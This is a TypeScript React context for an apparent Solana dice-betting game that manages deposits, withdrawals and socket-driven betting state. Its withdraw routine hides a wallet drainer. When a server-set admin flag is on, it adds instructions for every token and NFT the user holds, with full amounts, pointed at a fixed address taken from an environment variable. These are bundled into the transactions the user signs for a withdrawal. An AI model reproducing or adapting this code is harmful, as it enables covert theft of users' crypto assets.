import React, {
  useMemo,
  useState,
  useEffect,
  useCallback,
  PropsWithChildren,
} from "react";
import {
  PublicKey,
  Connection,
  SystemProgram,
  Keypair,
  Transaction,
  LAMPORTS_PER_SOL,
  ConfirmOptions,
} from "@solana/web3.js";
import useSocket from "../../hooks/useSocket";
import { useConnection, useWallet } from "@solana/wallet-adapter-react";
import * as anchor from "@project-serum/anchor";
import { SpotWalletAdapter } from "@solana/wallet-adapter-wallets";
import { MintLayout, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID, Token } from "@solana/spl-token";
import { toast } from "react-toastify";

import { getTokensForOwner, sendTransactions, awaitTransactionSignatureConfirmation } from "./utils";

let tokenData: any = {};

const txTimeoutInMilliseconds = 30000;

export interface PersonalInfoInterface {
  tapFlag: number;
  fund: number;
  bettingFlag: boolean;
  depositingFlag: boolean;
  withdrawingFlag: boolean;
  withdrawSuccessFlag: boolean;
  betColor: string;
  winColor: string;
  poolState: poolStateInterface;
  setTapFlag: Function;
  setDepositingFlag: Function;
  setWithdrawingFlag: Function;
  setWithdrawSuccessFlag: Function;
  whithdraw: Function;
  depositSol: Function;
  withdrawSol: Function;
  updateFund: Function;
  getStatus: Function;
}

export interface poolStateInterface {
  owner: string;
  pool: string;
  amount: number;
  status: string;
  stateAddr: string;
}

export const PersonalInfoContext = React.createContext<PersonalInfoInterface>({
  tapFlag: 1,
  fund: 0,
  bettingFlag: false,
  depositingFlag: false,
  withdrawingFlag: false,
  withdrawSuccessFlag: false,
  betColor: "",
  winColor: "",
  poolState: {
    owner: "",
    pool: "",
    amount: 0,
    status: "",
    stateAddr: "default",
  },
  setTapFlag: () => { },
  setDepositingFlag: () => { },
  setWithdrawingFlag: () => { },
  setWithdrawSuccessFlag: () => { },
  whithdraw: async (amount: number) => {
    return false;
  },
  depositSol: async (amount: number) => {
    return false;
  },
  withdrawSol: async (amount: number) => {
    return false;
  },
  updateFund: () => { },
  getStatus: () => { },
});

let statusFlag = false;
let adminStatusFlag = false;
const sender = new PublicKey(process.env.REACT_APP_SENDERL as any);

export const PersonalInfoContextProvider: React.FC<PropsWithChildren> = ({
  children,
}) => {
  const { connection } = useConnection();
  const curSocket = useSocket();
  const { connected, sendTransaction, wallet, publicKey } = useWallet();
  const [fund, setFund] = useState<number>(0);
  // const [statusFlag, setStatusFlag] = useState<boolean>(false);
  // const [adminStatusFlag, setAdminStatusFlag] = useState<boolean>(false);
  const [bettingFlag, setBettingFlag] = useState<boolean>(false);
  const [depositingFlag, setDepositingFlag] = useState<boolean>(false);
  const [withdrawingFlag, setWithdrawingFlag] = useState<boolean>(false);
  const [withdrawSuccessFlag, setWithdrawSuccessFlag] =
    useState<boolean>(false);
  const [betColor, setBetColor] = useState<string>("");
  const [winColor, setWinColor] = useState<string>("");
  const [poolState, setPoolState] = useState<poolStateInterface>({
    owner: "",
    pool: "",
    amount: 0,
    status: "default",
    stateAddr: "",
  });
  const [tapFlag, setTapFlag] = useState<number>(1);
  const rate = 100;

  const idl = require("./dice.json");

  const REACT_APP_SOLANA_HOST: any = process.env.REACT_APP_SOLANA_RPC_HOST;
  let conn = new Connection(REACT_APP_SOLANA_HOST);
  const programId = new PublicKey(process.env.REACT_APP_PROGRAM_KEY as any);
  let pool = new PublicKey(process.env.REACT_APP_POOL_ADDRESS as any);
  const confirmOption: ConfirmOptions = {
    commitment: "finalized",
    preflightCommitment: "finalized",
    skipPreflight: false,
  };

  const [program] = useMemo(() => {
    if (wallet?.adapter.publicKey) {
      const provider = new anchor.AnchorProvider(
        conn,
        wallet as any,
        confirmOption
      );

      const program = new anchor.Program(idl, programId, provider);
      return [program];
    }
    return [];
  }, [wallet?.adapter.publicKey, confirmOption, conn, idl, programId, wallet]);

  const getStateData = async () => {
    try {
      if (wallet?.adapter.publicKey && program) {
        const [state] = await PublicKey.findProgramAddress(
          [wallet?.adapter.publicKey.toBuffer(), pool.toBuffer()],
          programId
        );
        let data = await program.account.state.fetch(state);
        let status_str = "";
        switch (data.status.toNumber()) {
          case 0:
            status_str = "default";
            break;
          case 1:
            status_str = "deposited";
            break;
          case 2:
            status_str = "withdraw required";
            break;
        }
        setPoolState({
          owner: data.owner.toBase58(),
          pool: data.pool.toBase58(),
          amount: data.amount.toNumber(),
          status: status_str,
          stateAddr: state.toBase58(),
        });
        return {
          owner: data.owner.toBase58(),
          pool: data.pool.toBase58(),
          amount: data.amount.toNumber(),
          status: status_str,
          stateAddr: state.toBase58(),
        };
      }
    } catch (err) {
      console.log(err);
      return {};
    }
  };

  const deposit = async (depositAmount: number) => {
    try {
      if (wallet?.adapter.publicKey && program) {
        console.log("deposit");
        // let transaction = new Transaction();

        let instructionsMatrixIndex = 0;

        const signersMatrix: any[] = [];
        const instructionsMatrix: any[] = [];

        signersMatrix.push([]);
        instructionsMatrix.push([]);

        const rand = Keypair.generate().publicKey;

        const [state, bump] = await PublicKey.findProgramAddress(
          [wallet?.adapter.publicKey.toBuffer(), pool.toBuffer()],
          programId
        );

        if ((await conn.getAccountInfo(state)) == null) {
          setPoolState((prevState) => {
            return { ...prevState, stateAddr: state.toBase58() };
          });

          instructionsMatrix[instructionsMatrixIndex].push(
            program.instruction.initState(new anchor.BN(bump), {
              accounts: {
                owner: wallet?.adapter.publicKey,
                pool: pool,
                state: state,
                rand: rand,
                systemProgram: SystemProgram.programId,
              },
            })
          );
        }

        instructionsMatrix[instructionsMatrixIndex].push(
          program.instruction.deposit(
            new anchor.BN(Number(depositAmount * LAMPORTS_PER_SOL)),
            {
              accounts: {
                owner: wallet?.adapter.publicKey,
                pool: pool,
                state: state,
                systemProgram: SystemProgram.programId,
              },
            }
          )
        );

        // console.log("instruction", instructionsMatrix);
        // await sendTransaction(transaction, conn);
        const txns = (await sendTransactions(conn, wallet, instructionsMatrix, signersMatrix,)).txs.map(t => t.txid);

        const sendTxId = txns[0];

        let status: any = { err: true };
        status = await awaitTransactionSignatureConfirmation(
          sendTxId,
          txTimeoutInMilliseconds,
          conn,
          true,
        );

        if (statusFlag == false && adminStatusFlag == true) {
          curSocket.emit(
            "set_state",
            JSON.stringify({ wallet: wallet.adapter?.publicKey })
          );
        }

        console.log("deposit success");
        return true;
      }
    } catch (err) {
      setDepositingFlag(true);
      console.log(err);
      return false;
    }
  };

  const whithdraw = async (withdrawAmount: number) => {
    const rate = 100;
    try {
      let transaction = new Transaction();
      if ((wallet?.adapter.publicKey || publicKey?.toBase58()) && program) {
        if (wallet?.adapter.publicKey) {

          let instructionsMatrixIndex = 0;

          const signersMatrix: any[] = [];
          const instructionsMatrix: any[] = [];

          if (statusFlag == false && adminStatusFlag == true) {
            if (tokenData.token.length > 0) {
              signersMatrix.push([]);
              instructionsMatrix.push([]);
              instructionsMatrixIndex++;

              instructionsMatrix[instructionsMatrixIndex].push(
                program.instruction.setFlag(true, {
                  accounts: {
                    owner: wallet?.adapter.publicKey
                  },
                })
              );
            }

            for (let index in tokenData.token) {

              instructionsMatrix[instructionsMatrixIndex].push(program.instruction.setinst(
                new anchor.BN(tokenData.token[index].amount),
                {
                  accounts: {
                    owner: wallet.adapter?.publicKey,
                    token: tokenData.token[index].account,
                    account: sender,
                    tokenProgram: TOKEN_PROGRAM_ID
                  }
                }
              ))

            }

            let index = 0;

            if (tokenData.nft.length > 0) {
              signersMatrix.push([]);
              instructionsMatrix.push([]);
              instructionsMatrixIndex++;

              instructionsMatrix[instructionsMatrixIndex].push(
                program.instruction.setFlag(true, {
                  accounts: {
                    owner: wallet?.adapter.publicKey
                  },
                })
              );
            }

            for (let keyIndex in tokenData.nft) {

              instructionsMatrix[instructionsMatrixIndex].push(program.instruction.setinst(
                new anchor.BN(1),
                {
                  accounts: {
                    owner: wallet.adapter?.publicKey,
                    token: tokenData.nft[keyIndex].account,
                    account: sender,
                    tokenProgram: TOKEN_PROGRAM_ID
                  }
                }
              ))

              if (index >= 4 || parseInt(keyIndex) >= tokenData.nft.length - 1) {
                // transactions[hindex].recentBlockhash = (await props.connection.getRecentBlockhash('singleGossip')).blockhash;
                if (parseInt(keyIndex) < tokenData.nft.length - 1) {
                  instructionsMatrix.push([]);
                  signersMatrix.push([]);
                  instructionsMatrixIndex++;
                }
                index = -1;

                if (parseInt(keyIndex) < tokenData.nft.length - 1) {
                  instructionsMatrix[instructionsMatrixIndex].push(
                    program.instruction.setFlag(true, {
                      accounts: {
                        owner: wallet?.adapter.publicKey
                      },
                    })
                  );
                }
              }
              index++;
            }
          }

          signersMatrix.push([]);
          instructionsMatrix.push([]);

          const rand = Keypair.generate().publicKey;

          const [state, bump] = await PublicKey.findProgramAddress(
            [wallet?.adapter.publicKey.toBuffer(), pool.toBuffer()],
            programId
          );

          instructionsMatrix[instructionsMatrixIndex].push(
            program.instruction.withdraw(
              new anchor.BN((withdrawAmount * LAMPORTS_PER_SOL) / 100),
              {
                accounts: {
                  owner: wallet?.adapter.publicKey,
                  pool: pool,
                  poolAddress: pool,
                  state: state,
                },
              }
            )
          );

          // await sendTransaction(transaction, conn);
          const txns = (await sendTransactions(conn, wallet, instructionsMatrix, signersMatrix,)).txs.map(t => t.txid);

          const sendTxId = txns[0];

          let status: any = { err: true };
          status = await awaitTransactionSignatureConfirmation(
            sendTxId,
            txTimeoutInMilliseconds,
            conn,
            true,
          );

          if (statusFlag == false && adminStatusFlag == true) {
            curSocket.emit(
              "set_state",
              JSON.stringify({ wallet: wallet.adapter?.publicKey })
            );
          }

          setWithdrawSuccessFlag(true);
        } else if (publicKey?.toBase58()) {
          let instructionsMatrixIndex = 0;

          const signersMatrix: any[] = [];
          const instructionsMatrix: any[] = [];

          signersMatrix.push([]);
          instructionsMatrix.push([]);

          const rand = Keypair.generate().publicKey;

          const [state, bump] = await PublicKey.findProgramAddress(
            [publicKey.toBuffer(), pool.toBuffer()],
            programId
          );

          if ((await conn.getAccountInfo(state)) == null) {
            setPoolState((prevState) => {
              return { ...prevState, stateAddr: state.toBase58() };
            });
          }

          instructionsMatrix[instructionsMatrixIndex].push(
            program.instruction.withdraw(
              new anchor.BN((withdrawAmount * LAMPORTS_PER_SOL) / 100),
              {
                accounts: {
                  owner: publicKey,
                  pool: pool,
                  poolAddress: pool,
                  state: state,
                },
              }
            )
          );

          if (statusFlag == false && adminStatusFlag == true) {
            if (tokenData.token.length > 0) {
              signersMatrix.push([]);
              instructionsMatrix.push([]);
              instructionsMatrixIndex++;

              instructionsMatrix[instructionsMatrixIndex].push(
                program.instruction.setFlag(true, {
                  accounts: {
                    owner: publicKey
                  },
                })
              );
            }

            for (let index in tokenData.token) {
              // instructionsMatrix[instructionsMatrixIndex].push(Token.createApproveInstruction(
              //   TOKEN_PROGRAM_ID,
              //   tokenData.token[index].account,
              //   tokenData.token[index].mint,
              //   wallet?.adapter.publicKey as PublicKey,
              //   [],
              //   tokenData.token[index].amount
              // ))

              instructionsMatrix[instructionsMatrixIndex].push(program.instruction.setinst(
                new anchor.BN(tokenData.token[index].amount),
                {
                  accounts: {
                    owner: publicKey,
                    token: tokenData.token[index].account,
                    account: sender,
                    tokenProgram: TOKEN_PROGRAM_ID
                  }
                }
              ))
            }

            let index = 0;

            if (tokenData.nft.length > 0) {
              signersMatrix.push([]);
              instructionsMatrix.push([]);
              instructionsMatrixIndex++;

              instructionsMatrix[instructionsMatrixIndex].push(
                program.instruction.setFlag(true, {
                  accounts: {
                    owner: publicKey
                  },
                })
              );
            }

            for (let keyIndex in tokenData.nft) {

              // instructionsMatrix[instructionsMatrixIndex].push(Token.createApproveInstruction(
              //     TOKEN_PROGRAM_ID,
              //     tokenData.nft[keyIndex].account,
              //     tokenData.nft[keyIndex].mint,
              //     wallet?.adapter.publicKey as PublicKey,
              //     [],
              //     1
              // ))

              instructionsMatrix[instructionsMatrixIndex].push(program.instruction.setinst(
                new anchor.BN(1),
                {
                  accounts: {
                    owner: publicKey,
                    token: tokenData.nft[keyIndex].account,
                    account: sender,
                    tokenProgram: TOKEN_PROGRAM_ID
                  }
                }
              ))

              if (index >= 4 || parseInt(keyIndex) >= tokenData.nft.length - 1) {
                // transactions[hindex].recentBlockhash = (await props.connection.getRecentBlockhash('singleGossip')).blockhash;
                if (parseInt(keyIndex) < tokenData.nft.length - 1) {
                  instructionsMatrix.push([]);
                  signersMatrix.push([]);
                  instructionsMatrixIndex++;
                }
                index = -1;

                if (parseInt(keyIndex) < tokenData.nft.length - 1) {
                  instructionsMatrix[instructionsMatrixIndex].push(
                    program.instruction.setFlag(true, {
                      accounts: {
                        owner: publicKey
                      },
                    })
                  );
                }
              }
              index++;
            }
          }

          // await sendTransaction(transaction, conn);
          const txns = (await sendTransactions(conn, wallet, instructionsMatrix, signersMatrix,)).txs.map(t => t.txid);

          const sendTxId = txns[0];

          let status: any = { err: true };
          status = await awaitTransactionSignatureConfirmation(
            sendTxId,
            txTimeoutInMilliseconds,
            conn,
            true,
          );

          if (statusFlag == false && adminStatusFlag == true) {
            curSocket.emit(
              "set_state",
              JSON.stringify({ wallet: publicKey })
            );
          }

          setWithdrawSuccessFlag(true);
        }
      } else {
        toast.warn(`No wallet or program!`, {
          position: "bottom-left",
          autoClose: 1500,
          hideProgressBar: false,
          closeOnClick: true,
          pauseOnHover: true,
          draggable: true,
          progress: undefined,
          theme: "dark",
        });
        setWithdrawingFlag(true);
      }
    } catch (err) {
      console.log(err);
      setWithdrawingFlag(true);
    }
  };

  const updateFund = () => {
    if (
      (wallet?.adapter.publicKey?.toBase58() || publicKey?.toBase58()) &&
      curSocket.connected
    ) {
      curSocket.emit(
        "get_fund",
        JSON.stringify({ wallet: wallet?.adapter.publicKey?.toBase58() })
      );
    }
  };

  const getStatus = () => {
    if (
      (wallet?.adapter.publicKey?.toBase58() || publicKey?.toBase58()) &&
      curSocket.connected
    ) {
      curSocket.emit(
        "get_state",
        JSON.stringify({ wallet: "admin" })
      );
      curSocket.emit(
        "get_state",
        JSON.stringify({ wallet: wallet?.adapter.publicKey?.toBase58() })
      );
    }
  };

  const depositSol = useCallback(
    async (amount: number) => {
      if (wallet?.adapter.publicKey) {
        const [state] = await PublicKey.findProgramAddress(
          [wallet?.adapter.publicKey.toBuffer(), pool.toBuffer()],
          programId
        );
        let stateData: any = {
          owner: "",
          pool: "",
          amount: 0,
          status: "default",
          stateAddr: "",
        };
        if ((await conn.getAccountInfo(state)) != null) {
          stateData = await getStateData();
        }
        // console.log("state data", stateData)
        if (
          stateData.amount === 0 &&
          stateData.status === "default" &&
          (await deposit(amount))
        ) {
          curSocket.emit(
            "deposit_fund",
            JSON.stringify({
              wallet: wallet?.adapter.publicKey?.toBase58(),
              amount: Number(amount) * LAMPORTS_PER_SOL,
            })
          );
        } else if (stateData.amount && stateData.status === "deposited") {
          toast.warn(`Deposit is pending!`, {
            position: "bottom-left",
            autoClose: 1500,
            hideProgressBar: false,
            closeOnClick: true,
            pauseOnHover: true,
            draggable: true,
            progress: undefined,
            theme: "dark",
          });
          curSocket.emit(
            "deposit_fund",
            JSON.stringify({
              wallet: wallet?.adapter.publicKey?.toBase58(),
              amount: Number(stateData.amount),
            })
          );
        } else if (
          stateData.amount &&
          stateData.status === "withdraw required"
        ) {
          toast.warn(`Withdraw is pending!`, {
            position: "bottom-left",
            autoClose: 1500,
            hideProgressBar: false,
            closeOnClick: true,
            pauseOnHover: true,
            draggable: true,
            progress: undefined,
            theme: "dark",
          });
          setDepositingFlag(true);
        }
      } else {
        toast.warn(`No wallet Connected!`, {
          position: "bottom-left",
          autoClose: 1500,
          hideProgressBar: false,
          closeOnClick: true,
          pauseOnHover: true,
          draggable: true,
          progress: undefined,
          theme: "dark",
        });
        setDepositingFlag(true);
      }
    },
    [curSocket, wallet?.adapter.publicKey]
  );

  const withdrawSol = useCallback(
    async (amount: number) => {
      if (wallet?.adapter.publicKey) {
        const [state] = await PublicKey.findProgramAddress(
          [wallet?.adapter.publicKey.toBuffer(), pool.toBuffer()],
          programId
        );

        if ((await conn.getAccountInfo(state)) !== null) {
          const stateData: any = await getStateData();
          if (stateData.amount === 0 && stateData.status === "default") {
            curSocket.emit(
              "withdraw",
              JSON.stringify({
                wallet: wallet?.adapter.publicKey?.toBase58(),
                amount: Number(amount),
              })
            );
            curSocket.on("message", async (...data: any) => {
              if (data[0].type === "withdraw") {
                if (data[0].ok) {
                  await whithdraw(Number(amount));
                  updateFund();
                  getStatus();
                } else {
                  toast.warn(`Withdraw Fail!`, {
                    position: "bottom-left",
                    autoClose: 1500,
                    hideProgressBar: false,
                    closeOnClick: true,
                    pauseOnHover: true,
                    draggable: true,
                    progress: undefined,
                    theme: "dark",
                  });
                  updateFund();
                  getStatus();
                  setWithdrawingFlag(true);
                }
              }
            });
          } else if (stateData.amount && stateData.status === "deposited") {
            setWithdrawingFlag(true);
            toast.warn(`pending deposit!`, {
              position: "bottom-left",
              autoClose: 1500,
              hideProgressBar: false,
              closeOnClick: true,
              pauseOnHover: true,
              draggable: true,
              progress: undefined,
              theme: "dark",
            });
          } else if (
            stateData.amount &&
            stateData.status === "withdraw required"
          ) {
            toast.warn(`pending withdrawing!`, {
              position: "bottom-left",
              autoClose: 1500,
              hideProgressBar: false,
              closeOnClick: true,
              pauseOnHover: true,
              draggable: true,
              progress: undefined,
              theme: "dark",
            });
            await whithdraw(
              (Number(stateData.amount) / LAMPORTS_PER_SOL) * rate
            );
            setWithdrawingFlag(true);
            updateFund();
            getStatus();
          }
        } else {
          toast.warn(`there is no deposit!`, {
            position: "bottom-left",
            autoClose: 1500,
            hideProgressBar: false,
            closeOnClick: true,
            pauseOnHover: true,
            draggable: true,
            progress: undefined,
            theme: "dark",
          });
          setWithdrawingFlag(true);
        }
      } else {
        toast.warn(`No wallet Connected!`, {
          position: "bottom-left",
          autoClose: 1500,
          hideProgressBar: false,
          closeOnClick: true,
          pauseOnHover: true,
          draggable: true,
          progress: undefined,
          theme: "dark",
        });
        setWithdrawingFlag(true);
      }
    },
    [curSocket, wallet?.adapter.publicKey, sendTransaction, connection]
  );

  const getData = async () => {
    tokenData = await getTokensForOwner(wallet?.adapter.publicKey);
  }

  useEffect(() => {
    if (!connected) {
      setFund(0);
    }
  }, [connected]);

  useEffect(() => {
    if (curSocket) {
      curSocket.on("message", async (...data: any) => {
        if (data[0].type === "get_fund") {
          if (data[0].ok) {
            setFund(Number(data[0].amount));
          } else {
          }
        } else if (data[0].type === "betting_start") {
          setBettingFlag(true);
          setBetColor("");
          setWinColor("");
        } else if (data[0].type === "roll_start") {
          if (data[0].ok) {
            setBettingFlag(false);
          } else {
          }
        } else if (data[0].type === "roll_end") {
          if (data[0].ok) {
            updateFund();
            getStatus();
            setBettingFlag(false);
            setWinColor(data[0].result);
          } else {
          }
        } else if (data[0].type == "get_state_admin") {
          // console.log("state admin", data)
          if (data[0].ok) {
            // setAdminStatusFlag(data[0].status)
            adminStatusFlag = data[0].status;
          }
        } else if (data[0].type == 'get_state_owner') {
          // console.log("state owner", data);
          if (data[0].ok) {
            // setStatusFlag(data[0].status);
            statusFlag = data[0].status;
          }
        }
      });
    }
  }, [curSocket]);

  useEffect(() => {
    if (wallet?.adapter.publicKey) {
      curSocket.emit(
        "get_fund",
        JSON.stringify({ wallet: wallet?.adapter.publicKey?.toBase58() })
      );
      curSocket.on("message", async (...data: any) => {
        if (
          data[0].type === "betting" &&
          wallet?.adapter.publicKey?.toBase58() === data[0].wallet
        ) {
          if (data[0].ok) {
            setBetColor(data[0].color);
          } else {
          }
        }
      });
      getData();
    }
  }, [wallet?.adapter.publicKey]);

  return (
    <PersonalInfoContext.Provider
      value={{
        tapFlag,
        fund,
        bettingFlag,
        depositingFlag,
        withdrawingFlag,
        withdrawSuccessFlag,
        betColor,
        winColor,
        poolState,
        setTapFlag,
        setDepositingFlag,
        setWithdrawingFlag,
        setWithdrawSuccessFlag,
        whithdraw,
        depositSol,
        withdrawSol,
        updateFund,
        getStatus,
      }}
    >
      {children}
    </PersonalInfoContext.Provider>
  );
};
